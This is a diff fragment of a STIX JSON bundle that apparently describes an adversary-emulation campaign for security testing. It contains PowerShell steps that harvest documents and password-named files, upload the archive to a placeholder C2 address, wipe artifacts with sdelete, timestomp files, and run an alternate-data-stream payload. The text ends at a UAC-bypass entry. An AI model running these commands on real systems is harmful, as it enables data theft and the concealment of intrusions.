+            "created": "2024-02-03T15:12:49.189023Z",
+            "modified": "2024-02-03T15:12:49.189023Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--bddc0abc-07a0-41b7-813f-e0c64d9226b3",
+            "target_ref": "user-account--55201127-ef76-571d-a662-089e67da3960"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--55201127-ef76-571d-a662-089e67da3960",
+            "account_login": "1"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d94fd379-e0e0-4f21-b558-475fcf7c8b10",
+            "created": "2024-02-03T15:12:49.189442Z",
+            "modified": "2024-02-03T15:12:49.189442Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--bddc0abc-07a0-41b7-813f-e0c64d9226b3",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--630c52a5-0565-427e-98fc-88f26ab55f75",
+            "created": "2024-02-03T15:12:49.189667Z",
+            "modified": "2024-02-03T15:12:49.189667Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--bddc0abc-07a0-41b7-813f-e0c64d9226b3"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--0b1841bd-ef8b-475c-bce7-8fcb2860984a",
+            "created": "2024-02-03T15:12:49.189876Z",
+            "modified": "2024-02-03T15:12:49.189876Z",
+            "name": "Screen Capture (T1113)",
+            "description": "Native API call(s) were used to collect a screenshot.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1113",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\Get-Screenshot.ps1 -Verbose -Force;\nGet-Screenshot;\n",
+                                "payloads": [
+                                    "Get-Screenshot.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Screen Capture"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--64a89291-c3b6-4566-bdac-a11e6f544d9b",
+            "created": "2024-02-03T15:12:49.190084Z",
+            "modified": "2024-02-03T15:12:49.190084Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--0b1841bd-ef8b-475c-bce7-8fcb2860984a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--d5170a60-3bdc-44e0-9870-a38db5c0cf81",
+            "created": "2024-02-03T15:12:49.190288Z",
+            "modified": "2024-02-03T15:12:49.190288Z",
+            "name": "File and Directory Discovery (T1083)",
+            "description": "PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1083",
+                    "input_arguments": {
+                        "remote.file.share": {
+                            "default": "192.0.2.20",
+                            "description": "IP or Hostname of remote file share",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "ls #{remote.file.share}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "File and Directory Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2168815a-1085-4119-b603-347f747b9e42",
+            "created": "2024-02-03T15:12:49.190699Z",
+            "modified": "2024-02-03T15:12:49.190699Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--d5170a60-3bdc-44e0-9870-a38db5c0cf81",
+            "target_ref": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0",
+            "value": "192.0.2.20"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a58dbc6b-5148-461b-a9e2-577fd63deff6",
+            "created": "2024-02-03T15:12:49.190912Z",
+            "modified": "2024-02-03T15:12:49.190912Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--d5170a60-3bdc-44e0-9870-a38db5c0cf81"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--08e57385-dbce-4850-8bb7-589ef79465ab",
+            "created": "2024-02-03T15:12:49.191436Z",
+            "modified": "2024-02-03T15:12:49.191436Z",
+            "name": "Automated document collection (T1119)",
+            "description": "Execute PowerShell collection command to collect and compress files of specific extensions.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1059.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "move-item Rar.exe -Destination C:\\Windows\\Temp -Force;\n$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\working.zip -Force;\ncd C:\\Windows\\Temp;\n.\\Rar.exe a -hpfGzq5yKw \"$env:USERPROFILE\\Desktop\\working.zip\" \"$env:APPDATA\\working.zip\";\n",
+                                "payloads": [
+                                    "rar.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Command and Scripting Interpreter: PowerShell"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d60c7fd1-c151-48dc-b68b-3a18dffa216b",
+            "created": "2024-02-03T15:12:49.191651Z",
+            "modified": "2024-02-03T15:12:49.191651Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--08e57385-dbce-4850-8bb7-589ef79465ab"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--2d18c8ec-4593-49dc-9bf4-11d0673d6ae6",
+            "created": "2024-02-03T15:12:49.191865Z",
+            "modified": "2024-02-03T15:12:49.191865Z",
+            "name": "Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)",
+            "description": "Copy a target file from a remote file share through the existing C2 channel",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1041",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "remove-item upload.ps1 -Force\n",
+                                "command": "Import-Module .\\upload.ps1 -Verbose -Force;\nInvoke-MultipartFormDataUpload -InFile \"C:\\Users\\#{profile_user}\\Desktop\\working.zip\" -Uri \"#{server}/file/upload\";\n",
+                                "payloads": [
+                                    "upload.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Exfiltration Over C2 Channel"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--000ec966-81d6-4ac6-9112-2c1c109b6985",
+            "created": "2024-02-03T15:12:49.192856Z",
+            "modified": "2024-02-03T15:12:49.192856Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--2d18c8ec-4593-49dc-9bf4-11d0673d6ae6",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--710e24d2-6507-4efb-9f40-a7e3c8837166",
+            "created": "2024-02-03T15:12:49.193778Z",
+            "modified": "2024-02-03T15:12:49.193778Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--2d18c8ec-4593-49dc-9bf4-11d0673d6ae6",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--57dfb7cc-e346-4fa5-904c-3bb1cccf0a36",
+            "created": "2024-02-03T15:12:49.194102Z",
+            "modified": "2024-02-03T15:12:49.194102Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--2d18c8ec-4593-49dc-9bf4-11d0673d6ae6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--208b021b-c79a-4176-8ad1-3af99ed50c6f",
+            "created": "2024-02-03T15:12:49.194376Z",
+            "modified": "2024-02-03T15:12:49.194376Z",
+            "name": "Artifact Cleanup - Delete Staged Files",
+            "description": "Cleanup files related to Operation",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (!$(test-path -path \"C:\\Program Files\\SysInternalsSuite\")) {\n  mkdir \"C:\\Program Files\\SysInternalsSuite\";\n}\nset-location \"C:\\Program Files\\SysInternalsSuite\";\n\nif (!$(test-path -path \"sdelete64.exe\")) {\n  iwr -uri \"https://download.sysinternals.com/files/SDelete.zip\" -outfile sdelete64.zip;\n  Expand-Archive sdelete64.zip -force;\n}\ncopy sdelete64.exe C:\\Windows\\Temp\\;\ncd C:\\Windows\\Temp\\ ;\n.\\sdelete64.exe /accepteula C:\\Windows\\Temp\\Rar.exe;\n.\\sdelete64.exe /accepteula C:\\Users\\#{profile_user}\\AppData\\Roaming\\working.zip;\n.\\sdelete64.exe /accepteula C:\\Users\\#{profile_user}\\Desktop\\working.zip;\nremove-item C:\\Windows\\Temp\\sdelete64.exe -force;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--46f657fa-0503-44bc-95df-fb40b9995d64",
+            "created": "2024-02-03T15:12:49.19503Z",
+            "modified": "2024-02-03T15:12:49.19503Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--208b021b-c79a-4176-8ad1-3af99ed50c6f",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ab1fb1f7-0670-41d1-bdea-bba7da35e0c1",
+            "created": "2024-02-03T15:12:49.195269Z",
+            "modified": "2024-02-03T15:12:49.195269Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--208b021b-c79a-4176-8ad1-3af99ed50c6f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4b2e9574-b1a7-4b38-95b2-6054ded9c4fe",
+            "created": "2024-02-03T15:12:49.195477Z",
+            "modified": "2024-02-03T15:12:49.195477Z",
+            "name": "Scheduled Task",
+            "description": "Reboot the machine to aid in peristence callbacks",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1529",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "write-host \"[*] Restarting Computer\";\nRestart-Computer -Force;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Shutdown/Reboot"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c33eaeb9-c59e-4d12-8c77-3767e264dfcc",
+            "created": "2024-02-03T15:12:49.195704Z",
+            "modified": "2024-02-03T15:12:49.195704Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--4b2e9574-b1a7-4b38-95b2-6054ded9c4fe"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92",
+            "created": "2024-02-03T15:12:49.196196Z",
+            "modified": "2024-02-03T15:12:49.196196Z",
+            "name": "Artifact Cleanup",
+            "description": "Delete file artifacts left from the operation.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Remove-Item -Path \"$env:USERPROFILE\\Downloads\\*.pfx\" -Force;\nRemove-Item -Path \"$env:USERPROFILE\\Downloads\\*.bmp\" -Force;\nRemove-Item -Path \"$env:USERPROFILE\\Downloads\\*.png\" -Force;\nif (test-path -path \"$env:APPDATA\\OfficeSupplies.7z\") {\n    Remove-Item -Path \"$env:APPDATA\\OfficeSupplies.7z\" -Force; write-host \"[+] Successfully removed OfficeSupplies.7z\";\n} else {\n    write-host \"[!] File did not exist to be removed!\";\n}\n\nif (get-job -name \"Keystrokes\" -ErrorAction SilentlyContinue) {\n    Remove-Job -Name \"Keystrokes\";\n    if ($?) {\n        write-host \"[+] Job \\\"Keystrokes\\\" was remove.\";\n    }\n} else {\n    write-host \"[!] Job \\\"Keystrokes\\\" did not exist.\";\n}\n\nif (get-job -Name \"Screenshot\" -ErrorAction SilentlyContinue) {\n    Remove-Job -Name \"Screenshot\" -Force;\n    write-host \"[+] Job \\\"screenshot\\\" was removed.\";\n} else {\n    write-host \"[*] Job \\\"screenshot\\\" does not exist, thus was not removed.\";\n}\nremove-item upload.ps1 -Force;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6a0a1e41-3859-4134-98c2-ecc0f2785846",
+            "created": "2024-02-03T15:12:49.197178Z",
+            "modified": "2024-02-03T15:12:49.197178Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--00446217-53ca-4749-bacd-f41fe189d36e",
+            "created": "2024-02-03T15:12:49.197638Z",
+            "modified": "2024-02-03T15:12:49.197638Z",
+            "name": "Startup Folder Persistence Execution",
+            "description": "Sets credentials for a headless RDP session to spawn triggering startup folder persistence.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1037.005",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        },
+                        "profile_user_password": {
+                            "default": "Password123!",
+                            "description": "Password of profile user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};\nmstsc /v:127.0.0.2;\nsleep 10;\nGet-Process -name mstsc;\nif ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Boot or Logon Initialization Scripts: Startup Items"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--43673a84-37b9-4afe-a312-e39ab3b8e943",
+            "created": "2024-02-03T15:12:49.198808Z",
+            "modified": "2024-02-03T15:12:49.198808Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--00446217-53ca-4749-bacd-f41fe189d36e",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--25cad5d9-0e9c-4306-b3db-e7003a395515",
+            "created": "2024-02-03T15:12:49.200478Z",
+            "modified": "2024-02-03T15:12:49.200478Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--00446217-53ca-4749-bacd-f41fe189d36e",
+            "target_ref": "user-account--35fa5a90-8a11-4714-b830-70102b8549f4"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--35fa5a90-8a11-4714-b830-70102b8549f4",
+            "credential": "Password123!"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5cabd133-8ac4-4a58-90fa-41a1d3a29438",
+            "created": "2024-02-03T15:12:49.201058Z",
+            "modified": "2024-02-03T15:12:49.201058Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--00446217-53ca-4749-bacd-f41fe189d36e"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e506f811-884d-4992-aacb-514b33a0324f",
+            "created": "2024-02-03T15:12:49.201678Z",
+            "modified": "2024-02-03T15:12:49.201678Z",
+            "name": "Click .LNK payload",
+            "description": "Execute PowerShell collection command to collect and compress files of specific extensions.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1204.002",
+                    "input_arguments": {
+                        "profile_user_day2": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item \"$env:appdata\\Microsoft\\kxwn.lock\" -Force;\n",
+                                "command": "Set-Location -Path \"C:\\Users\\#{profile_user_day2}\\Desktop\";\n\nif(Test-Path -LiteralPath \"$env:appdata\\Microsoft\\kxwn.lock\"){\n  Remove-Item \"$env:appdata\\Microsoft\\kxwn.lock\" -Force;\n  Write-Host \"Removed old kxwn.lock file\";\n}\n\npowershell.exe Get-Content '.\\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "User Execution: Malicious File"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ff1962d3-4040-46f1-b047-57a06ba25751",
+            "created": "2024-02-03T15:12:49.202738Z",
+            "modified": "2024-02-03T15:12:49.202738Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--e506f811-884d-4992-aacb-514b33a0324f",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4b7b3440-da04-4887-b281-d6f99e081db2",
+            "created": "2024-02-03T15:12:49.20319Z",
+            "modified": "2024-02-03T15:12:49.20319Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--e506f811-884d-4992-aacb-514b33a0324f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4a2ad84e-a93a-4b2e-b1f0-c354d6a41278",
+            "created": "2024-02-03T15:12:49.20353Z",
+            "modified": "2024-02-03T15:12:49.20353Z",
+            "name": "Timestomp kxwn.lock",
+            "description": "Timestomp kxwn.lock",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1070.006",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (!(test-path -path \"$env:appdata\\Microsoft\\kxwn.lock\")) {\n  write-host \"[!] kxwn.lock was not found on this host.\";\n  exit 1;\n} else {\n  . .\\timestomp.ps1;\n  timestomp -dest \"$env:appdata\\Microsoft\\kxwn.lock\";\n}\n",
+                                "payloads": [
+                                    "timestomp.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: Timestomp"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--10abebe2-3c30-4115-9ad8-435e7bad9f04",
+            "created": "2024-02-03T15:12:49.204115Z",
+            "modified": "2024-02-03T15:12:49.204115Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--4a2ad84e-a93a-4b2e-b1f0-c354d6a41278"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f9c0b150-822f-497b-ad6d-187f24561e9a",
+            "created": "2024-02-03T15:12:49.2045Z",
+            "modified": "2024-02-03T15:12:49.2045Z",
+            "name": "Detect Anti-Virus",
+            "description": "Detect anti-virus software on host",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1518.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepTwelve.ps1;\ndetectav\n",
+                                "payloads": [
+                                    "stepTwelve.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Software Discovery: Security Software Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f2a6c587-ef72-43ac-a2ea-2214b91ad118",
+            "created": "2024-02-03T15:12:49.204819Z",
+            "modified": "2024-02-03T15:12:49.204819Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--f9c0b150-822f-497b-ad6d-187f24561e9a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--2b5a72b1-01e4-48ae-98b0-2570a7894371",
+            "created": "2024-02-03T15:12:49.20541Z",
+            "modified": "2024-02-03T15:12:49.20541Z",
+            "name": "Detect Software",
+            "description": "Detect software on host",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1518",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepTwelve.ps1;\nsoftware;\n",
+                                "payloads": [
+                                    "stepTwelve.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Software Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4cfc7336-b05d-4b0e-8c26-d547d26c07cd",
+            "created": "2024-02-03T15:12:49.205908Z",
+            "modified": "2024-02-03T15:12:49.205908Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--2b5a72b1-01e4-48ae-98b0-2570a7894371"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--0cfadbcb-ec21-44ae-adb7-9a23176dd620",
+            "created": "2024-02-03T15:12:49.206266Z",
+            "modified": "2024-02-03T15:12:49.206266Z",
+            "name": "Enumerate Computer Name",
+            "description": "Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepThirteen.ps1;\ncomp;\n",
+                                "payloads": [
+                                    "stepThirteen.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f4b6b51d-3756-413f-9ba9-82c7c3a85f1c",
+            "created": "2024-02-03T15:12:49.206967Z",
+            "modified": "2024-02-03T15:12:49.206967Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--0cfadbcb-ec21-44ae-adb7-9a23176dd620"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--96140694-6d13-40b6-9553-0e63533469f3",
+            "created": "2024-02-03T15:12:49.207361Z",
+            "modified": "2024-02-03T15:12:49.207361Z",
+            "name": "Enumerate Domain Name",
+            "description": "Domain triage",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepThirteen.ps1;\ndomain;\n",
+                                "payloads": [
+                                    "stepThirteen.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cf13210b-05e3-4f96-9eb4-8dad597483c4",
+            "created": "2024-02-03T15:12:49.207868Z",
+            "modified": "2024-02-03T15:12:49.207868Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--96140694-6d13-40b6-9553-0e63533469f3"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f320eebd-e75b-4194-b529-79e64ad0b9ee",
+            "created": "2024-02-03T15:12:49.208239Z",
+            "modified": "2024-02-03T15:12:49.208239Z",
+            "name": "Enumerate Username",
+            "description": "user triage",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1033",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepThirteen.ps1;\nuser;\n",
+                                "payloads": [
+                                    "stepThirteen.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Owner/User Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1a901c7b-839f-4bf9-8e03-65cdb056e278",
+            "created": "2024-02-03T15:12:49.208647Z",
+            "modified": "2024-02-03T15:12:49.208647Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--f320eebd-e75b-4194-b529-79e64ad0b9ee"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a34ab8f2-a106-41fb-af0b-cf5382bd18ae",
+            "created": "2024-02-03T15:12:49.208978Z",
+            "modified": "2024-02-03T15:12:49.208978Z",
+            "name": "Enumerate Processes",
+            "description": "Process triage",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepThirteen.ps1;\npslist;\n",
+                                "payloads": [
+                                    "stepThirteen.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7327c9a8-96f0-4f5a-b91f-13a4847e6af8",
+            "created": "2024-02-03T15:12:49.209205Z",
+            "modified": "2024-02-03T15:12:49.209205Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--a34ab8f2-a106-41fb-af0b-cf5382bd18ae"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5226e5dc-fc28-43b7-a679-0db49d520402",
+            "created": "2024-02-03T15:12:49.209426Z",
+            "modified": "2024-02-03T15:12:49.209426Z",
+            "name": "UAC Bypass via sdctl",
